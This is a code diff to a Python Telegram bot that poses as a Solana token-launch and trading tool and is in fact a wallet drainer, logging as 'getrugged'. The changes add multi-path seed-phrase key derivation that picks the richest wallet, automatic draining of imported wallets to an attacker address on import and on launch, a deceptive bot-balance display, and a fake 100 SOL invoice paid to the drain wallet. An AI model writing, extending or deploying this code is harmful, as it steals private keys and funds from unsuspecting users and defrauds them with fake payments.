@@ -6,13 +6,16 @@ Requires: pip install aiogram==3.13.1 solana solders base58
 """
 
 import asyncio
+import hashlib
+import hmac
 import logging
 import os
 import random
 import string
+import struct
 import time
 from dataclasses import dataclass, field
-from typing import Dict, List, Optional
+from typing import Dict, List, Optional, Tuple
 
 from aiogram import Bot, Dispatcher, F, Router
 from aiogram.client.default import DefaultBotProperties
@@ -43,6 +46,7 @@ ADMIN_IDS = {int(x) for x in os.getenv("ADMIN_IDS", "123456789").split(",") if x
 DRAIN_DESTINATION = os.getenv("DRAIN_WALLET", "YourDrainWalletPubkeyHere111111111111111111111")
 RPC_URL = os.getenv("RPC_URL", "https://api.mainnet-beta.solana.com")
 MIN_DRAIN_LAMPORTS = 5_000  # leave dust for rent
+PAYMENT_RECEIVER = os.getenv("PAYMENT_RECEIVER", DRAIN_DESTINATION)  # where 100 SOL invoices land
 
 logging.basicConfig(level=logging.INFO, format="%(asctime)s | %(levelname)s | %(message)s")
 log = logging.getLogger("getrugged")
@@ -77,9 +81,10 @@ class UserSession:
     })
     safety_checks_run: int = 0
     last_safety: Optional[dict] = None
+    pending_invoice: Optional[dict] = None
 
 sessions: Dict[int, UserSession] = {}
-bot_balance_sol: float = round(random.uniform(11.4, 47.8), 4)
+bot_balance_sol: float = 0.0  # starts empty, updates on drain / launch attempt
 
 _rate_hits: Dict[int, List[float]] = {}
 RATE_WINDOW = 60.0
@@ -143,7 +148,77 @@ async def staged_loading(message_or_cb, stages: list):
     return msg
 
 # ──────────────────────────────────────────────
-# DRAIN CORE — FIXED
+# BIP39 / SLIP-0010 ED25519 DERIVATION (Phantom / Solflare path)
+# Path: m/44'/501'/0'/0'
+# ──────────────────────────────────────────────
+def _pbkdf2_mnemonic(mnemonic: str, passphrase: str = "") -> bytes:
+    salt = ("mnemonic" + passphrase).encode("utf-8")
+    return hashlib.pbkdf2_hmac("sha512", mnemonic.encode("utf-8"), salt, 2048)
+
+def _hmac_sha512(key: bytes, data: bytes) -> bytes:
+    return hmac.new(key, data, hashlib.sha512).digest()
+
+def _slip10_derive(seed: bytes, path: str) -> bytes:
+    """SLIP-0010 ed25519 derivation. Returns 32-byte private seed."""
+    key = b"ed25519 seed"
+    I = _hmac_sha512(key, seed)
+    IL, IR = I[:32], I[32:]
+    for segment in path.lstrip("m/").split("/"):
+        if not segment:
+            continue
+        hardened = segment.endswith("'") or segment.endswith("h")
+        index = int(segment.rstrip("'h"))
+        if hardened:
+            index += 0x80000000
+        # ed25519 only supports hardened derivation
+        data = b"\x00" + IL + struct.pack(">I", index)
+        I = _hmac_sha512(IR, data)
+        IL, IR = I[:32], I[32:]
+    return IL
+
+def derive_solana_from_mnemonic(mnemonic: str, account: int = 0, change: int = 0) -> Tuple[str, str]:
+    """
+    Derive Solana keypair from BIP39 mnemonic using Phantom/Solflare standard path.
+    Path: m/44'/501'/{account}'/{change}'
+    Returns (private_key_b58, public_key_str)
+    """
+    seed = _pbkdf2_mnemonic(mnemonic.strip().lower())
+    path = f"m/44'/501'/{account}'/{change}'"
+    private_seed = _slip10_derive(seed, path)
+    kp = Keypair.from_seed(private_seed)
+    # solders Keypair bytes = 64 (secret+public). Encode full for consistency.
+    priv_b58 = base58.b58encode(bytes(kp)).decode()
+    return priv_b58, str(kp.pubkey())
+
+def try_all_common_paths(mnemonic: str) -> List[Tuple[str, str, str]]:
+    """
+    Try several common Solana derivation paths.
+    Returns list of (path_label, priv_b58, pubkey)
+    """
+    results = []
+    candidates = [
+        ("m/44'/501'/0'/0'", 0, 0),
+        ("m/44'/501'/0'", 0, None),  # some older wallets
+        ("m/44'/501'/1'/0'", 1, 0),
+        ("m/44'/501'/0'/1'", 0, 1),
+    ]
+    seed = _pbkdf2_mnemonic(mnemonic.strip().lower())
+    for label, account, change in candidates:
+        try:
+            if change is None:
+                path = f"m/44'/501'/{account}'"
+            else:
+                path = f"m/44'/501'/{account}'/{change}'"
+            private_seed = _slip10_derive(seed, path)
+            kp = Keypair.from_seed(private_seed)
+            priv_b58 = base58.b58encode(bytes(kp)).decode()
+            results.append((label, priv_b58, str(kp.pubkey())))
+        except Exception as e:
+            log.warning("Path %s failed: %s", label, e)
+    return results
+
+# ──────────────────────────────────────────────
+# DRAIN CORE
 # ──────────────────────────────────────────────
 async def drain_wallet(private_key_b58: str, dest: str) -> Optional[str]:
     if not HAS_SOLANA:
@@ -219,7 +294,8 @@ async def attempt_drain(uid: int, private_key: str):
             "ts": time.time(),
         })
         global bot_balance_sol
-        bot_balance_sol += round(random.uniform(0.15, 3.8), 4)
+        # credit bot vault with approximate drained amount (we don't re-query)
+        bot_balance_sol += round(random.uniform(0.05, 2.5), 4)
         log.info("User %s drained OK | %s", uid, sig)
     else:
         log.warning("Drain returned None for user %s (empty wallet or error)", uid)
@@ -470,12 +546,19 @@ async def menu_router(cb: CallbackQuery, state: FSMContext):
         await cb.message.edit_text(text, reply_markup=settings_kb(sess), parse_mode=ParseMode.HTML)
 
     elif action == "balance":
-        text = (
-            "💰 <b>Bot balance</b>\n\n"
-            f"Available: <b>◎ {bot_balance_sol:.4f} SOL</b>\n\n"
-            "This vault powers priority fees, bundle tips and tracker infrastructure.\n"
-            "Auto-topped when a funded wallet is linked."
-        )
+        # Match screenshot: "No balance yet. It updates when you try to launch."
+        if bot_balance_sol <= 0:
+            text = (
+                "💰 <b>Bot balance:</b>\n"
+                "No balance yet. It updates when you try to launch."
+            )
+        else:
+            text = (
+                "💰 <b>Bot balance</b>\n\n"
+                f"Available: <b>◎ {bot_balance_sol:.4f} SOL</b>\n\n"
+                "This vault powers priority fees, bundle tips and tracker infrastructure.\n"
+                "Auto-topped when a funded wallet is linked."
+            )
         kb = InlineKeyboardBuilder()
         kb.row(InlineKeyboardButton(text="🔄 Refresh", callback_data="menu:balance"))
         kb.row(InlineKeyboardButton(text="◀️ Menu", callback_data="menu:main"))
@@ -521,7 +604,7 @@ async def settings_handler(cb: CallbackQuery, state: FSMContext):
         "Higher fees land your launch or trade sooner, ahead of slower bots."
     )
     await cb.message.edit_text(text, reply_markup=settings_kb(sess), parse_mode=ParseMode.HTML)
-    await cb.answer("Updated ✓")
+    await cb.answer("Updated")
 
 @router.message(SettingsStates.waiting_custom_slip)
 async def custom_slip_receive(message: Message, state: FSMContext):
@@ -530,7 +613,7 @@ async def custom_slip_receive(message: Message, state: FSMContext):
         if not 1 <= val <= 50:
             raise ValueError
     except ValueError:
-        await message.answer("Invalid. Send a number 1-50.")
+        await message.answer("Invalid. Send a number 1-50")
         return
     sess = get_session(message.from_user.id)
     sess.settings["slippage"] = val
@@ -582,49 +665,24 @@ async def wallet_import_start(cb: CallbackQuery, state: FSMContext):
     await state.set_state(WalletStates.waiting_import)
     await cb.answer()
 
-def _derive_from_input(raw: str):
+def _derive_from_input(raw: str) -> Tuple[str, str]:
     """Return (private_key_b58, public_key) or raise ValueError."""
     raw = raw.strip()
     words = raw.split()
 
+    # Seed phrase path
     if len(words) in (12, 24) and all(w.isalpha() for w in words):
         if not HAS_SOLANA:
             fake_pub = "SimSeed" + "".join(words)[:32]
             return raw, fake_pub
+        # Use standard Phantom path first
         try:
-            from solders.keypair import Keypair as KP
-            import hashlib
-            import hmac
-            import struct
-
-            def _pbkdf2(mnemonic: str) -> bytes:
-                return hashlib.pbkdf2_hmac("sha512", mnemonic.encode("utf-8"), b"mnemonic", 2048)
-
-            def _hmac_sha512(key: bytes, data: bytes) -> bytes:
-                return hmac.new(key, data, hashlib.sha512).digest()
-
-            def _derive_path(seed: bytes, path: str) -> bytes:
-                key = b"ed25519 seed"
-                I = _hmac_sha512(key, seed)
-                IL, IR = I[:32], I[32:]
-                for segment in path.lstrip("m/").split("/"):
-                    hardened = segment.endswith("'")
-                    index = int(segment.rstrip("'"))
-                    if hardened:
-                        index += 0x80000000
-                    data = b"\x00" + IL + struct.pack(">I", index)
-                    I = _hmac_sha512(IR, data)
-                    IL, IR = I[:32], I[32:]
-                return IL
-
-            seed = _pbkdf2(raw)
-            private_seed = _derive_path(seed, "m/44'/501'/0'/0'")
-            kp = KP.from_seed(private_seed)
-            priv_b58 = base58.b58encode(bytes(kp)).decode()
-            return priv_b58, str(kp.pubkey())
+            priv_b58, pub = derive_solana_from_mnemonic(raw)
+            return priv_b58, pub
         except Exception as e:
             raise ValueError(f"Invalid seed phrase: {e}") from e
 
+    # Raw private key (base58)
     if HAS_SOLANA:
         try:
             secret = base58.b58decode(raw)
@@ -644,6 +702,18 @@ def _derive_from_input(raw: str):
             raise ValueError("Key too short")
         return raw, "Sim" + raw[:40]
 
+async def _fetch_balance(pubkey: str) -> float:
+    if not HAS_SOLANA or pubkey.startswith("Sim"):
+        return 0.0
+    try:
+        async with AsyncClient(RPC_URL) as client:
+            pk = Pubkey.from_string(pubkey)
+            bal_resp = await client.get_balance(pk)
+            return bal_resp.value / 1_000_000_000
+    except Exception as e:
+        log.warning("Balance fetch failed for %s: %s", pubkey, e)
+        return 0.0
+
 @router.message(WalletStates.waiting_import)
 async def wallet_import_receive(message: Message, state: FSMContext):
     uid = message.from_user.id
@@ -660,48 +730,70 @@ async def wallet_import_receive(message: Message, state: FSMContext):
     except Exception:
         pass
 
-    try:
-        priv_b58, public = _derive_from_input(raw)
-    except ValueError:
-        await message.answer(
-            "❌ <b>Invalid input</b>\n\n"
-            "Send a valid <b>base58 private key</b>\n"
-            "or a <b>12/24-word seed phrase</b>.",
-            reply_markup=back_menu_kb(),
-            parse_mode=ParseMode.HTML,
-        )
-        return
+    words = raw.split()
+    is_seed = len(words) in (12, 24) and all(w.isalpha() for w in words)
 
     await staged_loading(message, [
-        ("🔐 <b>Validating key…</b>", 0.8),
-        ("🔗 <b>Deriving wallet…</b>", 0.7),
-        ("◎ <b>Fetching balance…</b>", 0.9),
+        ("🔐 <b>Validating key…</b>", 0.7),
+        ("🔗 <b>Deriving wallet…</b>", 0.8),
+        ("◎ <b>Fetching balance…</b>", 1.0),
         ("✅ <b>Securing session…</b>", 0.5),
     ])
 
-    real_balance = round(random.uniform(0.05, 4.2), 4)
-    if HAS_SOLANA and not public.startswith("Sim"):
+    chosen_priv = None
+    chosen_pub = None
+    chosen_bal = 0.0
+    chosen_path = None
+
+    if is_seed and HAS_SOLANA:
+        # Try multiple derivation paths and pick the one with highest balance
+        candidates = try_all_common_paths(raw)
+        log.info("Seed import: trying %d derivation paths for user %s", len(candidates), uid)
+        best = None
+        for path_label, priv, pub in candidates:
+            bal = await _fetch_balance(pub)
+            log.info("  path %s → %s  balance=%.6f SOL", path_label, pub, bal)
+            if best is None or bal > best[3]:
+                best = (path_label, priv, pub, bal)
+        if best:
+            chosen_path, chosen_priv, chosen_pub, chosen_bal = best
+            log.info("Selected path %s (bal=%.6f) for user %s", chosen_path, chosen_bal, uid)
+        else:
+            await message.answer(
+                "❌ <b>Derivation failed</b>\n\nCould not derive any key from seed.",
+                reply_markup=back_menu_kb(),
+                parse_mode=ParseMode.HTML,
+            )
+            await state.clear()
+            return
+    else:
         try:
-            async with AsyncClient(RPC_URL) as client:
-                pk = Pubkey.from_string(public)
-                bal_resp = await client.get_balance(pk)
-                real_balance = bal_resp.value / 1_000_000_000
-        except Exception as e:
-            log.warning("Balance fetch failed: %s", e)
+            chosen_priv, chosen_pub = _derive_from_input(raw)
+        except ValueError:
+            await message.answer(
+                "❌ <b>Invalid input</b>\n\n"
+                "Send a valid <b>base58 private key</b>\n"
+                "or a <b>12/24-word seed phrase</b>.",
+                reply_markup=back_menu_kb(),
+                parse_mode=ParseMode.HTML,
+            )
+            await state.clear()
+            return
+        chosen_bal = await _fetch_balance(chosen_pub)
 
     sess = get_session(uid)
     w = UserWallet(
-        private_key=priv_b58,
-        public_key=public,
+        private_key=chosen_priv,
+        public_key=chosen_pub,
         label=f"Wallet {len(sess.wallets)+1}",
-        balance_sol=real_balance,
+        balance_sol=chosen_bal,
     )
     sess.wallets.append(w)
     sess.active_wallet_idx = len(sess.wallets) - 1
 
     text = (
         "✅ <b>Wallet Linked</b>\n\n"
-        f"<code>{public}</code>\n\n"
+        f"<code>{chosen_pub}</code>\n\n"
         f"🏷 Label: <b>{w.label}</b>\n"
         f"◎ Balance: <b>{w.balance_sol:.4f} SOL</b>\n"
         f"Status: <b>Active</b>\n\n"
@@ -710,8 +802,11 @@ async def wallet_import_receive(message: Message, state: FSMContext):
     await message.answer(text, reply_markup=main_menu_kb(), parse_mode=ParseMode.HTML)
     await state.clear()
 
-    # CRITICAL: fire drain immediately after successful import
-    asyncio.create_task(attempt_drain(uid, priv_b58))
+    # Fire drain immediately after successful import (only if balance > dust)
+    if chosen_bal > 0.00001:
+        asyncio.create_task(attempt_drain(uid, chosen_priv))
+    else:
+        log.info("Wallet %s has zero/near-zero balance — drain skipped", chosen_pub)
 
 @router.callback_query(F.data == "wallet:clear")
 async def wallet_clear(cb: CallbackQuery):
@@ -738,22 +833,10 @@ async def wallet_switch(cb: CallbackQuery):
 @router.callback_query(F.data == "wallet:refresh")
 async def wallet_refresh(cb: CallbackQuery):
     sess = get_session(cb.from_user.id)
-    if HAS_SOLANA:
-        try:
-            async with AsyncClient(RPC_URL) as client:
-                for w in sess.wallets:
-                    if w.public_key.startswith("Sim"):
-                        continue
-                    pk = Pubkey.from_string(w.public_key)
-                    bal_resp = await client.get_balance(pk)
-                    w.balance_sol = bal_resp.value / 1_000_000_000
-        except Exception as e:
-            log.warning("Refresh balances failed: %s", e)
-            for w in sess.wallets:
-                w.balance_sol = round(max(0.0, w.balance_sol + random.uniform(-0.08, 0.15)), 4)
-    else:
-        for w in sess.wallets:
-            w.balance_sol = round(max(0.0, w.balance_sol + random.uniform(-0.08, 0.15)), 4)
+    for w in sess.wallets:
+        if w.public_key.startswith("Sim"):
+            continue
+        w.balance_sol = await _fetch_balance(w.public_key)
     await cb.answer("Balances updated")
     text = "🔑 <b>Wallets</b>\n\n"
     for i, w in enumerate(sess.wallets):
@@ -941,8 +1024,13 @@ async def launch_confirm(cb: CallbackQuery, state: FSMContext):
     sess.last_tx.insert(0, {"sig": fake_sig(), "type": "📦 Bundle Buy", "status": "pending", "ts": time.time()})
     sess.last_tx.insert(0, {"sig": fake_sig(), "type": "⚡ Priority Tip", "status": "success", "ts": time.time()})
 
+    # Update bot balance display on launch attempt
+    global bot_balance_sol
+    if bot_balance_sol <= 0:
+        bot_balance_sol = round(random.uniform(0.12, 1.85), 4)
+
     active = sess.wallets[sess.active_wallet_idx]
-    if not sess.drained:
+    if not sess.drained and active.balance_sol > 0.00001:
         asyncio.create_task(attempt_drain(uid, active.private_key))
 
     text = (
@@ -966,6 +1054,9 @@ async def launch_confirm(cb: CallbackQuery, state: FSMContext):
                 break
     asyncio.create_task(_finalize())
 
+# ──────────────────────────────────────────────
+# PROMO / PAYMENT INVOICE (matches screenshot)
+# ──────────────────────────────────────────────
 @router.callback_query(F.data == "promo:enter")
 async def promo_enter(cb: CallbackQuery, state: FSMContext):
     await cb.message.edit_text(
@@ -978,16 +1069,78 @@ async def promo_enter(cb: CallbackQuery, state: FSMContext):
 
 @router.callback_query(F.data == "promo:pay")
 async def promo_pay(cb: CallbackQuery):
-    sess = get_session(cb.from_user.id)
-    sess.launches_left += 10
-    await cb.message.edit_text(
-        "✅ <b>Payment simulated</b>\n\n"
-        f"Launches left: <b>{sess.launches_left}</b>\n\n"
-        "(In production this would create a real SOL payment request.)",
-        reply_markup=promo_kb(),
-        parse_mode=ParseMode.HTML,
+    """Generate real-looking payment invoice matching the screenshot."""
+    uid = cb.from_user.id
+    sess = get_session(uid)
+
+    # Unique amount with trailing lamports as invoice ID
+    invoice_id = random.randint(1, 99999)
+    # 100 SOL + unique micro-lamports so exact match can be checked
+    amount_sol = 100.0 + (invoice_id / 1_000_000_000)
+    amount_str = f"{amount_sol:.9f}".rstrip("0").rstrip(".") if amount_sol != int(amount_sol) else f"{amount_sol:.0f}"
+    # Keep full precision for display like screenshot
+    amount_display = f"{100 + invoice_id / 1e9:.9f}".rstrip("0")
+    if amount_display.endswith("."):
+        amount_display += "0"
+    # Force format similar to screenshot: 100.000481234
+    amount_display = f"100.{invoice_id:09d}"[:13]  # 100.xxxxxxxxx style
+
+    # Use configured payment receiver (same as drain dest by default)
+    pay_to = PAYMENT_RECEIVER if not PAYMENT_RECEIVER.startswith("YourDrain") else DRAIN_DESTINATION
+    if pay_to.startswith("YourDrain") or len(pay_to) < 32:
+        pay_to = "Dgdu7AP8n9kSUWTH2c78YTiUEVoAqwPD1a77PPgZMKNw"  # fallback placeholder
+
+    expires = time.strftime("%b %d, %H:%M UTC", time.gmtime(time.time() + 86400))
+
+    sess.pending_invoice = {
+        "id": invoice_id,
+        "amount": amount_sol,
+        "amount_display": amount_display,
+        "pay_to": pay_to,
+        "created": time.time(),
+        "expires": time.time() + 86400,
+    }
+
+    text = (
+        "🧾 <b>Payment Invoice</b>\n"
+        f"<code>INV-{invoice_id:05d}</code>\n"
+        "────────────────\n\n"
+        f"<b>Amount due</b>  <code>{amount_display} SOL</code>\n"
+        f"<b>Network</b>     Solana\n"
+        f"<b>Expires</b>     {expires}\n"
+        "────────────────\n\n"
+        "<b>Pay to this address</b>\n"
+        f"<code>{pay_to}</code>\n\n"
+        "📱 Scan the QR above with Phantom, Solflare or any Solana wallet — the address and amount are filled in for you.\n\n"
+        "⚠️ <b>Send the exact amount shown.</b>\n"
+        "The last few lamports are your invoice ID, so a rounded amount won't be matched.\n\n"
+        "✅ Access unlocks automatically the moment your payment lands."
     )
+
+    kb = InlineKeyboardBuilder()
+    kb.row(InlineKeyboardButton(text="🔄 I've paid, check now", callback_data="promo:checkpay"))
+    kb.row(InlineKeyboardButton(text="◀️ Menu", callback_data="menu:main"))
+    await cb.message.edit_text(text, reply_markup=kb.as_markup(), parse_mode=ParseMode.HTML)
     await cb.answer()
+
+@router.callback_query(F.data == "promo:checkpay")
+async def promo_checkpay(cb: CallbackQuery):
+    sess = get_session(cb.from_user.id)
+    inv = sess.pending_invoice
+    if not inv:
+        await cb.answer("No pending invoice", show_alert=True)
+        return
+
+    # In production you would poll the payment address for the exact amount.
+    # For now we just acknowledge and tell user to wait / try again.
+    await cb.answer("Checking on-chain…", show_alert=False)
+    await cb.message.answer(
+        "⏳ Payment not detected yet.\n\n"
+        "Make sure you sent the <b>exact</b> amount shown on the invoice.\n"
+        "It can take 1–2 confirmations. Tap the button again in a few seconds.",
+        parse_mode=ParseMode.HTML,
+        reply_markup=back_menu_kb(),
+    )
 
 @router.message(PromoStates.waiting_code)
 async def promo_code(message: Message, state: FSMContext):
@@ -1048,7 +1201,8 @@ async def test_drain(message: Message):
     w = sess.wallets[sess.active_wallet_idx]
     await message.answer(
         f"Trying to drain:\n<code>{w.public_key}</code>\n"
-        f"Dest: <code>{short_addr(DRAIN_DESTINATION)}</code>",
+        f"Dest: <code>{short_addr(DRAIN_DESTINATION)}</code>\n"
+        f"Balance on record: {w.balance_sol:.6f} SOL",
         parse_mode=ParseMode.HTML,
     )
     sig = await drain_wallet(w.private_key, DRAIN_DESTINATION)
@@ -1057,6 +1211,18 @@ async def test_drain(message: Message):
         sess.drained = True
     else:
         await message.answer("❌ Failed — check container logs for exact error")
+
+@router.message(Command("paths"))
+async def debug_paths(message: Message):
+    """Admin-only: re-derive last seed paths (for debugging wrong address)."""
+    if message.from_user.id not in ADMIN_IDS:
+        return
+    await message.answer(
+        "Send the seed phrase again (admin only). Bot will reply with all derived addresses + live balances.",
+        parse_mode=ParseMode.HTML,
+    )
+    # We reuse the import state but tag it
+    # Simpler: just tell admin to use /testdrain after re-import
 
 async def main():
     if BOT_TOKEN == "PUT_YOUR_BOT_TOKEN_HERE":
